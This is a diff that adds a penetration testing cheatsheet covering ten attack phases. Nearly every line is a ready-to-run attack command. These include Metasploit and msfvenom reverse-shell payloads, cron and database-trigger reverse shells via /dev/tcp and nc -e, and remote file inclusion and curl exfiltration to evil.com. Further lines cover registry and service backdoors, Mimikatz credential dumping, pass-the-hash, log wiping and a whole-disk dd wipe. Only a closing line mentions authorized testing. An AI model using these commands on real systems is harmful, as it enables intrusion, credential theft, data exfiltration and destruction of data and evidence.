@@ -1,0 +1,234 @@
+PENETRATION TESTING ATTACK PHASES MASTER CHEATSHEET
+COMPLETE LIFECYCLE FROM RECON TO COVERING TRACKS
+
+PHASE 1: RECONNAISSANCE (INFORMATION GATHERING)
+
+PASSIVE RECONNAISSANCE TECHNIQUES
+DNS enumeration: dig any target.com OR nslookup -type=any target.com
+WHOIS information: whois target.com OR whois 192.168.1.100
+Netcraft site report: netcraft.com
+Shodan search: shodan.io search queries
+Google dorking: site:target.com filetype:pdf OR intitle:"index of" password
+LinkedIn employee mining: linkedin.com search for company employees
+Wayback Machine: web.archive.org for historical site data
+Certificate transparency: crt.sh for SSL certificate discovery
+Social media profiling: twitter, facebook company pages
+
+ACTIVE RECONNAISSANCE TECHNIQUES
+Subdomain discovery: sublist3r -d target.com OR amass enum -d target.com
+Port scanning: nmap -sS -sV -O -A target.com OR masscan -p1-65535 192.168.1.0/24
+Web directory brute force: dirb http://target.com OR gobuster dir -u http://target.com -w big.txt
+Banner grabbing: nc -nv target.com 80 OR telnet target.com 25
+SNMP enumeration: snmpwalk -c public -v1 192.168.1.100
+SMB enumeration: enum4linux 192.168.1.100 OR smbclient -L 192.168.1.100
+SMTP user enumeration: smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100
+
+PHASE 2: SCANNING AND ENUMERATION
+
+NETWORK SCANNING
+Comprehensive nmap: nmap -sS -sU -sV -O -A -p- -T4 target.com
+UDP scanning: nmap -sU -sV --top-ports 100 target.com
+Firewall evasion: nmap -f -D RND:10 --data-length 50 -sS target.com
+Service version detection: nmap -sV --version-intensity 9 target.com
+NSE scripting: nmap --script vuln,safe,auth target.com
+
+VULNERABILITY SCANNING
+Nessus scanning: nessuscli scan create --target target.com --policy "Basic Network Scan"
+OpenVAS scanning: gvm-cli socket --xml "<create_task><name>Scan</name><target>192.168.1.100</target><config>Full and fast</config></create_task>"
+Nexpose: nexpose-cli scan create --site "Main Site" --assets 192.168.1.100
+
+WEB APPLICATION SCANNING
+Burp Suite: Manual mapping with Burp Proxy and Scanner
+OWASP ZAP: zap-baseline.py -t http://target.com
+Nikto: nikto -h http://target.com -C all
+SQL injection testing: sqlmap -u "http://target.com/page?id=1" --batch --level=5 --risk=3
+XSS testing: xsstrike -u http://target.com --crawl
+
+PHASE 3: GAINING INITIAL ACCESS
+
+EXPLOITATION FRAMEWORKS
+Metasploit: msfconsole -> use exploit/windows/smb/ms17_010_eternalblue -> set RHOSTS -> exploit
+Metasploit handler: msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"
+Empire: uselistener http; set Host http://192.168.1.50; execute; back; usestager multi/launcher; set Listener http; execute
+
+WEB APPLICATION EXPLOITATION
+SQL injection: sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbs
+File upload bypass: upload .php files with .jpg extension or using double extensions
+Local File Inclusion: http://target.com/index.php?page=../../../etc/passwd
+Remote File Inclusion: http://target.com/index.php?page=http://evil.com/shell.txt
+Command injection: http://target.com/ping.php?ip=127.0.0.1; whoami
+
+NETWORK SERVICE EXPLOITATION
+SMB exploits: eternalblue, smbghost, zerologon testing
+SSH exploits: ssh user@target.com with weak credentials or known vulnerabilities
+FTP exploits: anonymous login, buffer overflows in FTP services
+RDP exploits: bluekeep vulnerability, credential spraying
+Database exploits: MySQL UDF exploitation, PostgreSQL command execution
+
+SOCIAL ENGINEERING
+Phishing emails: setoolkit -> Social-Engineering Attacks -> Spear-Phishing Attack Vectors
+Malicious documents: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
+Watering hole attacks: compromising frequently visited websites
+USB drops: creating malicious USB devices with autorun.inf
+
+PHASE 4: MAINTAINING ACCESS (PERSISTENCE)
+
+OPERATING SYSTEM PERSISTENCE
+Windows registry: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\malware.exe"
+Windows services: sc create "SystemService" binPath= "C:\windows\system32\malware.exe" start= auto
+Linux cron jobs: (crontab -l ; echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/443 0>&1") | crontab -
+Linux systemd: create service file in /etc/systemd/system/backdoor.service
+SSH backdoors: echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys
+Web shells: upload php, asp, jsp web shells to web directories
+
+APPLICATION-LEVEL PERSISTENCE
+Database triggers: CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW BEGIN SYSTEM 'nc -e /bin/bash 192.168.1.50 4444'; END
+WordPress plugins: modify existing plugins to include backdoor code
+Custom services: create fake services that call back to C2 server
+
+MEMORY PERSISTENCE
+Meterpreter persistence: run persistence -U -i 60 -p 443 -r 192.168.1.50
+Empire persistence: usemodule persistence/userland/registry
+PowerShell profiles: add backdoor code to $PROFILE
+Bash profiles: add reverse shell to .bashrc or .profile
+
+PHASE 5: PRIVILEGE ESCALATION
+
+WINDOWS PRIVILEGE ESCALATION
+Token impersonation: incognito OR meterpreter's getsystem
+Service permissions: accesschk.exe -uwcqv "Authenticated Users" *
+AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Unquoted service paths: sc qc ServiceName
+DLL hijacking: procmon.exe to identify missing DLLs
+Kernel exploits: windows-exploit-suggester.py --update
+
+LINUX PRIVILEGE ESCALATION
+SUID binaries: find / -perm -4000 2>/dev/null
+Sudo rights: sudo -l
+Capabilities: getcap -r / 2>/dev/null
+Cron jobs: crontab -l && ls -la /etc/cron*
+Kernel exploits: linux-exploit-suggester.sh
+Docker escape: check for docker container, /proc/1/cgroup
+
+PASSWORD HARVESTING
+Mimikatz: sekurlsa::logonpasswords OR lsadump::sam
+LaZagne: laZagne.exe all
+Windows credential manager: cmdkey /list
+Linux memory: strings /dev/mem | grep -i password
+Bash history: cat ~/.bash_history
+
+PHASE 6: LATERAL MOVEMENT
+
+PASSWORD REUSE ATTACKS
+Password spraying: crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Company123!' 
+Pass the hash: pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.100 cmd
+Pass the ticket: mimikatz # kerberos::ptt administrator.kirbi
+
+REMOTE EXECUTION METHODS
+PSExec: psexec.py domain/user:password@192.168.1.100
+WMI: wmiexec.py domain/user:password@192.168.1.100
+WinRM: evil-winrm -i 192.168.1.100 -u administrator -p password
+SSH: ssh user@192.168.1.100 -i id_rsa
+RDP: xfreerdp /u:admin /p:password /v:192.168.1.100
+
+SHARE AND SERVICE EXPLOITATION
+SMB shares: smbclient //192.168.1.100/Share -U user
+NFS shares: showmount -e 192.168.1.100
+MySQL: mysql -h 192.168.1.100 -u root -p
+MSSQL: sqsh -S 192.168.1.100 -U sa -P password
+
+PHASE 7: DATA EXFILTRATION
+
+NETWORK EXFILTRATION METHODS
+DNS tunneling: dnscat2 client to server communication
+HTTP/HTTPS: curl -X POST -d @sensitive.txt http://evil.com/upload
+ICMP: icmpsh tunneling
+FTP: ftp evil.com and upload files
+SMB: copy files to attacker SMB share
+
+ENCRYPTION AND COMPRESSION
+Compress data: tar -czf data.tar.gz /sensitive/ && split -b 1M data.tar.gz
+Base64 encoding: cat file.txt | base64 | tr -d '\n'
+Custom protocols: netcat for raw data transfer
+
+TIMING AND SIZE EVASION
+Slow transfer: split files and transfer during business hours
+Size limits: break files into small chunks
+Protocol hopping: use multiple protocols to avoid detection
+
+PHASE 8: MAINTAINING PRESENCE
+
+ADVANCED PERSISTENCE MECHANISMS
+Domain persistence: Golden Ticket attacks with mimikatz
+DNS persistence: modify DNS records for C2 communication
+VPN persistence: create additional VPN users
+Cloud persistence: create backdoor IAM users in AWS/Azure
+
+ROOTKITS AND STEALTH
+Linux rootkits: Diamorphine, Reptile
+Windows rootkits: Fu, HackerDefender
+Bootkits: modify boot sector for persistence
+Firmware implants: BIOS/UEFI level persistence
+
+C2 COMMUNICATION CHANNELS
+Domain fronting: use CDN providers to hide C2 traffic
+Protocol impersonation: make C2 traffic look like legitimate protocols
+Custom encryption: implement AES-256 for C2 communications
+Fast-flux DNS: rapidly changing DNS records for resilience
+
+PHASE 9: COVERING TRACKS
+
+LOG MANIPULATION
+Windows event logs: wevtutil cl system OR wevtutil cl security
+Linux auth logs: sed -i '/192.168.1.50/d' /var/log/auth.log
+Apache logs: sed -i '/192.168.1.50/d' /var/log/apache2/access.log
+IIS logs: find and remove entries from IIS log files
+Bash history: history -c && history -w OR echo "" > ~/.bash_history
+
+FILE SYSTEM CLEANUP
+Timestamp modification: touch -t 202001010000 malicious_file.exe
+File deletion: sdelete -z C: on Windows OR shred -z -u file.txt on Linux
+Metadata removal: exiftool -all= image.jpg
+Temporary file cleanup: rm -rf /tmp/malicious*
+
+NETWORK ARTIFACT REMOVAL
+Firewall rules: iptables -D INPUT -s 192.168.1.50 -j DROP (remove specific rules)
+ARP cache: arp -d 192.168.1.50
+DNS cache: ipconfig /flushdns on Windows OR systemd-resolve --flush-caches on Linux
+
+MEMORY CLEANING
+Process hiding: migrate meterpreter to legitimate process
+Memory deallocation: free memory used by malicious code
+Driver unloading: unload malicious kernel drivers
+
+ANTI-FORENSIC TECHNIQUES
+
+DISK WIPING
+Whole disk: dd if=/dev/zero of=/dev/sda
+File wiping: sdelete -p 7 file.txt (7 passes)
+Free space wiping: sdelete -z C: on Windows
+
+EVIDENCE DESTRUCTION
+Log file destruction: find /var/log -name "*.log" -exec shred -u {} \;
+Database cleanup: DELETE FROM access_log WHERE ip='192.168.1.50'
+Registry cleaning: reg delete for all created keys
+
+STEGANOGRAPHY
+Data hiding: steghide embed -cf image.jpg -ef data.txt -p password
+Network steganography: covert channels in TCP headers
+
+PHASE 10: REPORTING AND DOCUMENTATION
+
+EVIDENCE COLLECTION
+Screenshots: meterpreter's screenshot command
+Keylogging: meterpreter's keyscan_start, keyscan_dump
+Network captures: tcpdump during exploitation
+File downloads: download sensitive files as evidence
+
+FINDINGS DOCUMENTATION
+Vulnerability details: CVE numbers, CVSS scores
+Exploitation steps: detailed methodology
+Business impact: how vulnerabilities affect the organization
+Remediation recommendations: specific fixes for each finding
+
+This comprehensive attack lifecycle cheatsheet covers the complete penetration testing process from initial reconnaissance to covering tracks. Remember that these techniques should only be used in authorized testing environments with proper permission and documentation.
